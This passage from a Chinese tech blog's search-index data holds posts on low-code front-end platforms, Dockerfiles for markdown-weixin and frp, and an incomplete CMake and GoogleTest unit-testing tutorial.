738944996410255f00ba1e63d4d5a352b0122f24b03d8fd4d1c782c31e10ae7328ca63206f7604d228d03cd0fb7a929c693c9eeb16abdb7efb62f0847fe0d5c90304d0fc96b10c91a8773a0eba075f828aebb454062dde9e8388d86049dca56a8721e0c42c8a6f6629fbcd80e79f4ce19128e63366c4a662db6dc1239da192076e8524a8f265a1c1fd8c4434c084f0ac77bada151e50f2742e6ba724a516a4805a758f01087e47496356c5e63d56e50fab7ae317cf9a31f15b5a6cc862577074383856f74edcf7e865ae1712d3bdcae2f6c2d493097cd936d8c0ddb7dd835c95260c3e9cac4398000d79685507f3a5b91afbe94478cdc611ecd447303b4b611bbaa99dca1b20aae3aa0b22f2e59a68b784d73207c85dbe0fce22256153e3d29ff98d8b8d5b9a70de3467f063cb862adbcd66af0116977ab60f1752aed30ce133409e87ab27af274f44ff7fd1211f16a7c0b6f834405d8312b208bcd87cce9cb54ee72bd48f49e219d93ca8a5a5c2bc6c91127d535af544a1e084ded0948b2fe779ff50a86bef02a0d447f88937dd5bb83e94841fdda0aed5ceae473ccea3ca9f20517583494b9386843a2cc63ca1fd70861f3decbe0b24b76e8a4a6bd6ee8f8466bbdecefe9b74e87f351069fb5acf88737bba25c0d241bb943205e2b7644a839b5ceafeb410b378229dcc856d127b5ac9b52f8eccea3bdcecb17920ad53eed66e472fbde810ab52af7320c0d2b848df18ca4210b6309eea227974ad34b3b11011177e15e2c407d41a53592e36c299fe1ba73ae0d49d07e980d2d5f8572ae986a96939bcd588d06838b4804b2d547faea27504a705518868f3f4ebde1f9d6ebd3c778ddbf4b39776800c7968eef2ab1e8fcf6c949416c10b837f83f5288519249a99813718aea9bb5816bb0f8db8b398f1e23332de2f21f758bffc6610f2b65bdc2d8e499e9ea06c5987b20ca75b85ae30edf5271a4691cbb538e2e6a49200736ff0a99c18cebb686d594fbca559a673ceeaecca9e84df2934f81c3d6dda845e60472c7f75a61a1228f8e36b87c411d8c195b68c6cf9e9371f0c688e95036d5cb7e3b732960ae14bb24570f37b3dcc9c3bf416567b90dd47e803329bd6fbc530b7a6a3736853d0ab0016fd99d27dbe4e24321044c111145431b6f08ed699752e866cccbc5e64a061a052462a9abe3dbe47a7ee3c7861bbf427d3f2d0065c17b086d974535d18a5db8578429c0bf831f9bb73ff6c30f09fc3e3d46589cd5bb4ae2bc0bf477fde11244c979565362763267c6f42757d7f30dc60182f4d3096492c13030fdac2dcbf0a519b37a7e07b0f5f5d26df2ae4c8b4acb06408e9a89c97420cac28dd06e1353d091aa1a6b0fcbc6433bba6c22e63fffba37a641cc14689ae608f39c0f3ee63e4ba62443442aa9cb3de9c7c0bac831375c507bd154d46afd99c90b3261e0f8bf2010ce9162be9684d445b83b6d52af7e3ee341025c841540ea4f882ef6e75fceaacd918b76603ec232f6cbdf64f9b703c2c5e09695a235e37bd76a4f4aa594203ba29f18a239a34ee38b085ffabf9da6dde963f71da4108f7703bcb65995b1225f226b4979c8fdc9c7f42cd14da1ad44d40e6fd5ab6184689bc32b10c45ac57ad910b3beb067f643ad5683079369cb95365cda3b4c0d73f539940492e98ef5cfe1b6f3d3133be12aced43d5857e23bb108ea33a2afc77293da5286e8b692c2e5e24c3ad78f927b68e97c21b3bb223b7e34f8a290a862fe2ddaef112a71642fd81eb1ae7639b288df19d431e64e0ca002a5aab944b5133dad387682ee3a6a4d1ac98a305cbd6109cee49bc250942384ac05bc584796f2b1be8b882e39eaa7d3980261d5c2d9ebb108ddab92cf6800b4054a69d70c40394bdd2b465cfb88328c14d0f1038db68f127a73463e298762569c2f465c4d42be127a15fb0c170361053c8110cbc15d00a90c82276d65af8f815499c5ff3f7d6fabbba72ca624310b11adec157ca62c0e222ab1e76ccfc6fba8a3b0559c4362d492e1ac577e6cae02114694ddf7ca27a7d71137c8df17593208db3df753295e1d383a2b7be4fbc821fcc9948d0f951f574ba601dd75ec8cd3962c435f2ae0b5f7abeae0b5dcb8c2031559a3e5bd2b58c0f1d669130f172243670335870f9a574b51362465393fc89099bdc16bb6969c16dcef910076103c803ca3c9eca21bbf672b0c115856575b8ece1303161c5a75ab046fa4c89239ede8eb1db817f10c696d59f3be7fb5780ae19c15a8d8d831e50bc8f33a0da818ff3ce0409f27daa42fb2ee7ce97080c2b9a565462fc2d52d3b912ababc568cf2a66fe8c754b96fb73131a52df5de3283fc1ee2f31ea33f1116c078e3b73112c1ca902f77d42112d2c4c9ebe2374ac9fade3b03d7b06ae0bec2b0676911c0e212ba228a1053b57bb93d32b65628b450e60a3974a9b7fbbe1ad2d3b42e8f284b32d92bc95ed6f1f67ffa5247e17c6d446653ad45f88283eb8367522efac95e5f40916831a1b90f66e0c25b58475177679da88373eb9d66154612df1b5f74f33299c2fddca6bf179267bc23d4119a40ab4600ac9ae88e539da35b20c4a373cc7f6cb9138a67d09c9660918f77a02335d05401a2b8c0624e104547c4f4e90b5b4f30ad6fb9ffc19479feeae71bda1c063182d35b4e386b033519bb419190bb151b0a9f3c63d0c1ebd0a8cc9f0ecb2338b8f91cd700405313d6539a8f8149ab14ca903cd9e1b88098cc513a0fd413602eec8fae4d861c4368822a0f8f5c1fcd9fe4b397564e43de53666a46e6183544ae029cfa7bd0cf7a98682e8f5b63bb618a55f26c8037279177a2e9b9993ea61cf42208e6ee8a515ad4e4750da02b53df6b491244a1fb8c17c595eaef1eca2c153ccf741dbe80825d9b2df7dc3d3412923a6c15a6282930aef74d32a24519cd7708c2bce7a8638fb68d7bc98e3d396db9eae11c3a49ec527647768bc7f43b5e8b4d41dff6011559eb857f8c5e1ffd65777e0b9b8173ee6f1ddef5f4e2391fa3af21f4aed85d21404fe055d6ca46953e88c978c08 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"初探最流行的前端低代码平台",url:"/posts/65ee20c1.html",text:'前言在 2022 年，“低代码” 成了热门的话题，各大云厂商都在这个领域发力。那么作为普通的企业，是否也可以深度定制一套自己的 “低代码” 平台呢？ 云厂商的低代码平台阿里云阿里云推出了易搭，通过简单的拖拽、配置，即可完成业务应用的搭建。旨在为广大中小企业提供一套低成本的企业应用搭建解决方案。应用无缝植入钉钉企业工作台，随时随地、高效协同。 腾讯云腾讯云则是推出了微搭，通过行业化模板、拖放式组件和可视化配置快速构建多端应用（小程序、H5 应用、Web 应用等），打通了小程序、云函数。 开源的低代码平台基础平台amis提示 amis GitHub 仓库 amis 官方中文文档 amis 是一个低代码前端框架，它使用 JSON 配置来生成页面，可以减少页面开发工作量，极大提升效率，由百度团队开源。 用 JSON 写页面的好处 为了实现用最简单方式来生成大部分页面，amis 的解决方案是基于 JSON 来配置，它的独特好处是： 不需要懂前端：在百度内部，大部分 amis 用户之前从来没写过前端页面，也不会 JavaScript，却能做出专业且复杂的后台界面，这是所有其他前端 UI 库都无法做到的； 不受前端技术更新的影响：百度内部最老的 amis 页面是 6 年多前创建的，至今还在使用，而当年的 Angular/Vue/React 版本现在都废弃了，当年流行的 Gulp 也被 Webpack 取代了，如果这些页面不是用 amis，现在的维护成本会很高； 享受 amis 的不断升级：amis 一直在提升细节交互体验，比如表格首行冻结、下拉框大数据下不卡顿等，之前的 JSON 配置完全不需要修改； 可以完全使用 可视化页面编辑器 来制作页面；一般前端可视化编辑器只能用来做静态原型，而 amis 可视化编辑器做出的页面是可以直接上线的。 amis 的其它亮点 提供完整的界面解决方案：其它 UI 框架必须使用 JavaScript 来组装业务逻辑，而 amis 只需 JSON 配置就能完成完整功能开发，包括数据获取、表单提交及验证等功能，做出来的页面不需要经过二次开发就能直接上线； 大量内置组件（120+），一站式解决：其它 UI 框架大部分都只有最通用的组件，如果遇到一些稍微不常用的组件就得自己找第三方，而这些第三方组件往往在展现和交互上不一致，整合起来效果不好，而 amis 则内置大量组件，包括了富文本编辑器、代码编辑器、diff、条件组合、实时日志等业务组件，绝大部分中后台页面开发只需要了解 amis 就足够了； 支持扩展：除了低代码模式，还可以通过 自定义组件 来扩充组件，实际上 amis 可以当成普通 UI 库来使用，实现 90% 低代码，10% 代码开发的混合模式，既提升了效率，又不失灵活性； 容器支持无限级嵌套：可以通过嵌套来满足各种布局及展现需求； 经历了长时间的实战考验：amis 在百度内部得到了广泛使用，在 6 年多的时间里创建了 5 万页面，从内容审核到机器管理，从数据分析到模型训练，amis 满足了各种各样的页面需求，最复杂的页面有超过 1 万行 JSON 配置。 amis 不适合做什么 使用 JSON 有优点但也有明显缺点，在以下场合并不适合 amis： 大量定制 UI：JSON 配置使得 amis 更适合做有大量常见 UI 组件的页面，但对于面向普通客户（toC）的页面，往往追求个性化的视觉效果，这种情况下用 amis 就不合适，实际上绝大部分前端 UI 组件库也都不适合，只能定制开发。 极为复杂或特殊的交互： 有些复杂的前端功能，比如 可视化编辑器，其中有大量定制的拖拽操作，这种需要依赖原生 DOM 实现的功能无法使用 amis。 但对于某些交互固定的领域，比如图连线，amis 后续会有专门的组件来实现。 mometa提示 mometa GitHub 仓库 mometa 是一款面向研发的低代码元编程，代码可视编辑，辅助编码工具。 背景 mometa 不是传统主流的低代码平台（如 amis / 云凤蝶），mometa 是面向研发的、代码可视设计编辑平台，它更像是 dreamweaver、gui 可视编辑之于程序员。 特性 面向研发的代码可视化编辑，直接作用于源码 响应式布局、路由模拟、物料预览 反向定位（视图定位源码） 拖拽插入物料 拖拽移动 上下移动 删除 替换 层级选择 接入友好，Webpack&gt;=4 插件化接入 开发友好，物料库支持热更新，不破坏已有开发模式 开放物料生态，可定制团队内物料库，见 mometa-mat 多语言、多生态支持，目前暂只支持 React，后续有计划支持 Vue 解决的问题 对低代码平台不形成依赖，二次开发可以无缝进入代码开发模式 同时支持所见即所得的可视编辑，用于提效，提升开发体验 提供物料生态，可自定义物料，提升物料使用体验，提升复用率 mometa 定位更多是基于程序员本地开发的模式，新增了可视化编码的能力（修改的也是本地的代码文件本身）。它更像是辅助编码工具，而不是 No-Code (amis / 云凤蝶) 的平台方案。 Sortable提示 Sortable GitHub 仓库 Sortable 是一个用于可重新排序的拖放列表的 JavaScript 库，可实现适用于现代浏览器和触摸设备的可重新排序的拖放列表，不需要依赖 jQuery 或框架。 H5 开发H5-Dooring提示 H5-Dooring GitHub 仓库 H5-Dooring 官方 Wiki H5-Dooring 是一款功能强大，专业可靠的 H5 可视化页面配置解决方案，致力于提供一套简单方便、专业可靠、无限可能的 H5 落地页最佳实践。技术栈以 React 和 Typescript 为主， 后台采用 Nodejs 开发，正在探索 h5-lowcode 解决方案。 luban-h5提示 luban-h5 GitHub 仓库 luban-h5 官方中文文档 luban-h5 在线 Demo 演示 鲁班 H5 是基于 Vue2.0 开发，通过拖拽快速生成页面的平台，类似 易企秀、Maka、百度 H5 等平台。 quark-h5提示 quark-h5 GitHub 仓库 quark-h5 是一款基于 Vue2 + Koa2 的 H5 页面可视化制作工具，让不会写代码的人也能轻松快速上手制作 H5 页面。类似易企秀、百度 H5 等 H5 制作、建站工具。 其他开源项目 h5-factory：H5 页面制作，移动端专题活动页面可视化编辑 lz-h5-edit：随心秀（React 版 H5 微场景编辑器)，一款类似易企秀、兔展的 H5 微场景编辑器 vite-vue3-lowcode：移动端低代码平台，实现了可视化拖拽、可视化编辑器，类似易企秀的 H5 制作、建站工具、可视化搭建工具； 参考博客 云凤蝶低代码之路 搭建自己的低代码平台 云凤蝶可视化搭建的推导与实现 Vue + Koa 从零打造一个 H5 页面可视化编辑器 - quark-h5 基于 Koa2 打造属于自己的 MVC 框架，仿 Egg 的简易版本 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开源 前端"},{title:"Markdown 转换微信公众号文章内容",url:"/posts/1c073f45.html",text:'前言使用微信公众号编辑器有一个十分头疼的问题 —— 粘贴出来的代码，格式错乱，而且特别丑。markdown-weixin 是一款让 Markdown 转微信公众号内容的神器，能让 Markdown 内容，无需作任何调整就能一键复制到微信公众号使用，而且特别针对代码展示做了优化。 项目构建1234567891011121314# 拉取源代码$ git clone https://github.com/rqh656418510/markdown-weixin.git# 进入源代码目录$ cd markdown-weixin# 安装依赖$ npm install# 构建项目$ npm run build# 查看构建生成的文件（docs目录可直接部署到Web服务器）$ ls -al docs 演示效果提示 markdown-weixin 的 在线使用地址 markdown-weixin 的 GitHub 仓库地址 使用 Docker12345# 构建镜像# docker build -f Dockerfile -t clay/markdown-weixin:latest .# 启动容器# docker run -d -p 8080:80 clay/markdown-weixin:latest Docker 容器运行起来之后，打开浏览器访问 http://127.0.0.1:8080 即可，完整的 Dockerfile（基于 Debian 9 + Tengine） 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879FROM node:14-stretchMAINTAINER clay&lt;clay@gmail.com&gt;# 创建用户RUN groupadd tengine &amp;&amp; useradd -g tengine tengine# 更换软件源RUN cp /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list &amp;&amp; \\ echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# 安装依赖RUN apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ apt-get -y install vim tree htop apt-utils net-tools telnet wget curl &amp;&amp; \\ apt-get -y install autoconf git build-essential libpcre3 libpcre3-dev zlib1g zlib1g.dev openssl libssl-dev &amp;&amp; \\ apt-get -y autoclean &amp;&amp; apt-get -y autoremove# 定义Tengine的版本号ENV VERSION 2.2.3# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# 进入解压目录WORKDIR /usr/local/src/tengine-$VERSION# 编译安装RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_module \\ &amp;&amp; make \\ &amp;&amp; make install# 设置环境变量ENV PATH $PATH:$TENGINE_HOME/sbin# 定义APP目录ENV APP_HOME $TENGINE_HOME/html# 编译APP项目RUN mkdir -p /tmp/markdown-weixin \\ &amp;&amp; git clone https://github.com/rqh656418510/markdown-weixin /tmp/markdown-weixin \\ &amp;&amp; cd /tmp/markdown-weixin \\ &amp;&amp; npm config set registry https://registry.npm.taobao.org \\ &amp;&amp; npm install \\ &amp;&amp; npm run build# 拷贝APP项目编译后的文件RUN mkdir -p $APP_HOME \\ &amp;&amp; rm -rf $APP_HOME/* \\ &amp;&amp; cp -R -rf /tmp/markdown-weixin/docs/* $APP_HOME# 清理文件RUN rm -rf /usr/local/src &amp;&amp; rm -rf /tmp/markdown-weixin# 设置默认工作目录WORKDIR $APP_HOME# 暴露端口EXPOSE 80EXPOSE 443CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客 前端"},{title:"Docker 构建 Frp 镜像",url:"/posts/8285186a.html",text:'前言 Frp 官方文档 Frp GitHub 项目 Frp Docker GitHub 项目 构建 Frps 镜像 Dockerfile 编写 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frps /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frps.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frps -c /etc/frp/frps.ini 构建镜像 1# docker build -f Dockerfile -t clay/frps:0.38.0 . 启动镜像 1# docker run --restart=always --network host -d -v /etc/frp/frps.ini:/etc/frp/frps.ini --name frps clay/frps 查看日志信息 1# docker logs -f --tail 20 frps 构建 Frpc 镜像 Dockerfile 编写 123456789101112131415161718FROM amd64/alpine:3.10LABEL maintainer="snowdream &lt;sn0wdr1am@icloud.com&gt;"ENV FRP_VERSION 0.38.0RUN cd /root \\ &amp;&amp; wget --no-check-certificate -c https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; tar zxvf frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; cd frp_${FRP_VERSION}_linux_amd64/ \\ &amp;&amp; cp frpc /usr/bin/ \\ &amp;&amp; mkdir -p /etc/frp \\ &amp;&amp; cp frpc.ini /etc/frp \\ &amp;&amp; cd /root \\ &amp;&amp; rm frp_${FRP_VERSION}_linux_amd64.tar.gz \\ &amp;&amp; rm -rf frp_${FRP_VERSION}_linux_amd64/ ENTRYPOINT /usr/bin/frpc -c /etc/frp/frpc.ini 构建镜像 1# docker build -f Dockerfile -t clay/frpc:0.38.0 . 启动镜像 1# docker run --restart=always --network host -d -v /etc/frp/frpc.ini:/etc/frp/frpc.ini --name frpc clay/frpc 查看日志信息 1# docker logs -f --tail 20 frpc var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化"},{title:"CMake 入门教程之三单元测试",url:"/posts/52f22f9b.html",text:'前言CMake 是一个跨平台的 C/C++ 项目组织管理工具，虽然许多 IDE 都有私有的项目管理工具，但是在现在各大 IDE 基本都支持使用 CMake 管理项目，所以如果有跨平台的需求，使用 CMake 管理是最方便的。值得一提的是，CMake 支持 gtest、cppunit 等单元测试框架，当然也可以使用断言自定义单元测试。 创建简单的带单元测试的项目创建项目工程下载代码 点击下载 完整的案例代码，项目的目录结构如下： 12345678910111213minder-test├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp└── test ├── CMakeLists.txt ├── include │ └── strUtil.h └── src └── main.cpp 编写项目代码 include/datetime.h 1234567891011121314151617181920#pragma once#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// 日期工具类class DateUtil {public: static string formatCurrentTime(); static string formatCurrentTime(string format); static int dayOfWeek(const string &amp;date); static bool isWeekendDays(const string &amp;date);}; src/datetime.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include "datetime.h"// 格式化当前时间// 默认格式是: 2020-06-07 23:46:53string DateUtil::formatCurrentTime() { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// 格式化当前时间// format: 格式字符串，例如 %Y-%m-%d %H:%M:%Sstring DateUtil::formatCurrentTime(string format) { time_t rawtime; struct tm *info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}// 根据给定的日期，计算它是星期几// date: 日期字符串，格式是: 2021-12-01// 返回值：1, 2, 3, 4, 5, 6, 0, 其中 0 表示星期日int DateUtil::dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// 根据给定的日期，判断是否为周末// date: 日期字符串，格式是: 2021-12-01bool DateUtil::isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;} src/main.cpp 12345678910#include &lt;iostream&gt;#include "datetime.h"using namespace std;int main() { cout &lt;&lt; DateUtil::formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; DateUtil::formatCurrentTime("%Y-%m-%d") &lt;&lt; endl; return 0;} test/include/strUtil.h 1234567891011121314#pragma once#include &lt;iostream&gt;using namespace std;// 去除字符串两边的空格void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);} test/src/main.cpp 1234567891011121314151617#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"using namespace std;int main() { // 去除字符串两边的空格 string str = " Hello World ! "; trim(str); cout &lt;&lt; str &lt;&lt; endl; // 根据给定的日期，计算它是星期几 cout &lt;&lt; "wday = " &lt;&lt; DateUtil::dayOfWeek("2022-01-11") &lt;&lt; ", "; cout &lt;&lt; "isWeekendDays = " &lt;&lt; (DateUtil::isWeekendDays("2022-01-11") ? "true" : "false") &lt;&lt; endl; return 0;} 其中 test 目录可以视作为子项目，和主目录分开编译。为了模拟更真实的企业项目开发场景，这里的 test/src/main.cpp 同时引入了 datetime.h 和 strUtil.h 头文件。 CMake 配置文件 主目录的 CMakeLists.txt 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# 项目信息project(minder)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 输出调试信息set(CMAKE_CXX_FLAGS "-g")# 开启所有警告set(CMAKE_CXX_FLAGS "-Wall")# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 引入主项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索主项目的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# 指定可执行文件的名称和主项目的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# 启用项目测试enable_testing()# 添加子目录（测试项目）add_subdirectory(test)# 添加测试项目的可执行文件add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) 特别说明： set(CMAKE_CXX_FLAGS "-xxx")：指定编译参数，细化的还有 CMAKE_CXX_FLAGS_DEBUG 和 CMAKE_CXX_FLAGS_RELEASE add_subdirectory(xxx)：添加子目录（子项目），要求子目录里必须有单独的 CMakeLists.txt，该文件包含了子目录的编译配置信息 add_test(xxx ${PROJECT_SOURCE_DIR}/test/build/xxx)：第一个参数是某个单元测试的名称，第二个参数是该单元测试的可执行文件的路径 test 目录的 CMakeLists.txt 12345678910111213141516171819202122232425262728cmake_minimum_required(VERSION 3.15)# 项目信息project(minder_test)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 搜索父目录（父项目）的头文件include_directories(../include)# 搜索父目录（父项目）的源文件aux_source_directory(../src MAIN_SOURCES)# 排除父目录（父项目）的入口源文件list(FILTER MAIN_SOURCES EXCLUDE REGEX "main.cpp")# 引入子项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索子项目里的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src TEST_SOURCES)# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 指定可执行文件的名称和单元测试的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES} ${TEST_SOURCES}) 这里的 test 作为子项目，主要要生成单元测试的可执行文件。 命令行编译项目 编译 test 子项目 1234567891011121314151617# 进入子项目的目录$ cd minder-test/test# 创建子项目的构建目录$ mkdir build# 进入子项目的构建目录$ cd build# 构建子项目$ cmake ..# 编译子项目$ make# 运行可执行文件$ ./minder_test 编译主项目 1234567891011121314151617181920# 进入主项目的目录$ cd minder-test# 创建主项目的构建目录$ mkdir build# 进入主项目的构建目录$ cd build# 构建主项目$ cmake ..# 编译主项目$ make# 执行项目测试$ make test# 运行可执行文件$ ./minder CMake 使用 GoogleTest 测试框架相关站点 GoogleTest 官方文档 GoogleTest GitHub 仓库 GoogleTest 官方下载页面 GoogleTest 的安装GoogleTest 编译安装注意事项 GoogleTest 最新版（1.11.0）要求使用 GCC 5.0+ 和 Clang 5.0+，若 GCC 的版本比较低，建议安装 GoogleTest 1.10.0 或者 1.8.1 版本 实测 GCC 4.8.5 可以正常使用 GoogleTest 的 1.10.0 版本，不兼容 1.11.0 版本 1234567891011121314151617181920212223# 下载文件$ wget https://github.com/google/googletest/archive/refs/tags/release-1.11.0.tar.gz# 解压文件$ tar -xvf release-1.11.0.tar.gz# 进入解压目录$ cd googletest-release-1.11.0# 创建构建目录$ mkdir build# 进入构建目录$ cd build# 生成makefile，如果需要构建得到动态链接库，则必须添加参数 "-DBUILD_SHARED_LIBS=ON"，否则默认只会得到静态库（.a）$ cmake -DBUILD_SHARED_LIBS=ON -Dgtest_build_samples=ON ..# 编译$ make -j4# 安装$ make install 值得一提的是，安装命令执行完成后，会自动将 libgmock_main.so 、libgmock.so、libgtest_main.so、libgtest.so 库文件拷贝到 /usr/local/lib64/ 目录下。GoogleTest 的头文件则会安装在 /usr/local/include/gmock 和 /usr/local/include/gtest/ 目录。 GoogleTest 验证安装 创建 C++ 源文件 test.cpp 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;gtest/gtest.h&gt;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main( int argc, char *argv[] ){ ::testing::InitGoogleTest( &amp;argc, argv ); return(RUN_ALL_TESTS() );} 使用 G++ 命令编译 C++ 源文件 12345678910111213141516# 编译源文件$ g++ -std=c++11 test.cpp -lpthread /usr/local/lib64/libgtest.so -o test# 运行可执行文件，若输出以下的日志信息，则说明GoogleTest安装成功$ ./test[==========] Running 1 test from 1 test suite.[----------] Global test environment set-up.[----------] 1 test from COutputPopLimitStrategyTest[ RUN ] COutputPopLimitStrategyTest.PositiveNos[ OK ] COutputPopLimitStrategyTest.PositiveNos (0 ms)[----------] 1 test from COutputPopLimitStrategyTest (1 ms total)[----------] Global test environment tear-down[==========] 1 test from 1 test suite ran. (1 ms total)[ PASSED ] 1 test. G++ 编译参数说明： -std=c++11：指定 C++ 的版本 /usr/local/lib64/libgtest.so：链接 GoogleTest 的动态链接库 -lpthread：由于 GoogleTest 的内部使用了多线程，因此需要链接 pthread 库 Google Test 的使用案例创建项目工程下载代码 点击下载 完整的案例代码，项目的目录结构如下： 12345678910111213minder-gtest├── CMakeLists.txt├── include│ └── datetime.h├── src│ ├── datetime.cpp│ └── main.cpp└── test ├── CMakeLists.txt ├── include │ └── strUtil.h └── src └── main.cpp 编写项目代码下载代码 这里的 C++ 代码，除了 main.cpp 的代码不一样之外，其他代码与上面的案例代码完全一致，不再累述。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include "strUtil.h"#include "datetime.h"#include &lt;gtest/gtest.h&gt;using namespace std;// 去除字符串两边的空格TEST(TestCase, test1) { string str = " Hello World ! "; trim(str); ASSERT_EQ("Hello World !", str);}// 根据给定的日期，计算它是星期几TEST(TestCase, test2) { ASSERT_EQ(true, DateUtil::isWeekendDays("2022-01-09"));}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake 配置文件 主目录的 CMakeLists.txt，这里的配置内容与上面的案例没有任何区别 12345678910111213141516171819202122232425262728293031323334cmake_minimum_required(VERSION 3.15)# 项目信息project(minder)# 定义C++的版本set(CMAKE_CXX_STANDARD 11)# 输出调试信息set(CMAKE_CXX_FLAGS "-g")# 开启所有警告set(CMAKE_CXX_FLAGS "-Wall")# 指定构建输出的目录set(PROJECT_BINARY_DIR ${PROJECT_SOURCE_DIR}/build)# 引入主项目的头文件include_directories(${PROJECT_SOURCE_DIR}/include)# 搜索主项目的源文件aux_source_directory(${PROJECT_SOURCE_DIR}/src MAIN_SOURCES)# 指定可执行文件的名称和主项目的所有源文件add_executable(${PROJECT_NAME} ${MAIN_SOURCES})# 启用单元测试enable_testing()# 添加子目录（子项目）add_subdirectory(test)# 添加单元测试的可执行文件add_test(minder_test ${PROJECT_SOURCE_DIR}/test/build/minder_test) test 目录的 CMakeLists.txt，这里的配置内容新增了 